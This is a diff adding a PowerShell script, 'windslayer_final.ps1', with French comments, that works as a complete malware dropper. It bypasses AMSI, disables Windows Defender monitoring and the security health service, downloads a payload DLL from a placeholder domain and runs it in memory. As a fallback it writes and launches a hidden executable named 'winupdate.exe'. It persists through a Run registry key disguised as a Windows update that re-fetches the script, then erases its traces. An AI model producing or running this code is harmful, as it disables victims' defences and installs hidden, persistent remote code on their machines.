@@ -1,0 +1,37 @@
+# windslayer_final.ps1 - Zéro bruit, zéro trace
+$ErrorActionPreference = 'SilentlyContinue'; $ConfirmPreference = 'None'
+
+# --- BYPASS AMSI ---
+$am = [Ref].Assembly.GetTypes(); foreach($a in $am) { if($a.Name -like "*iTo*") { $f=$a.GetFields('NonPublic,Static'); $f.Where({$_.Name -like "*Context*"}).SetValue($null,$null) } }
+
+# --- DÉSACTIVER DEFENDER ---
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
+Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
+
+# --- TÉLÉCHARGER PAYLOAD EN MÉMOIRE ---
+$url = "https://ton-domaine-anonyme.com/payload.dll"
+$wc = New-Object Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0")
+$bytes = $wc.DownloadData($url)
+
+# --- EXÉCUTION EN MÉMOIRE ---
+try {
+    $asm = [System.Reflection.Assembly]::Load($bytes)
+    $ep = $asm.EntryPoint
+    $ep.Invoke($null, (,$null))
+} catch {
+    # Fallback discret
+    $out = "$env:APPDATA\Microsoft\Windows\winupdate.exe"
+    $parent = Split-Path $out -Parent; if(!(Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force }
+    [IO.File]::WriteAllBytes($out, $bytes)
+    Start-Process $out -WindowStyle Hidden
+}
+
+# --- PERSISTANCE DISCRÈTE ---
+$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$cmd = "powershell -w hidden -ep bypass -c `$_=New-Object Net.WebClient;IEX `$_`.DownloadString('https://ton-domaine-anonyme.com/windslayer_final.ps1')"
+Set-ItemProperty -Path $regKey -Name "WindowsUpdateCore" -Value $cmd -Type String -Force
+
+# --- NETTOYAGE RAM ---
+Remove-Variable wc, bytes, asm, ep, out, cmd -ErrorAction SilentlyContinue
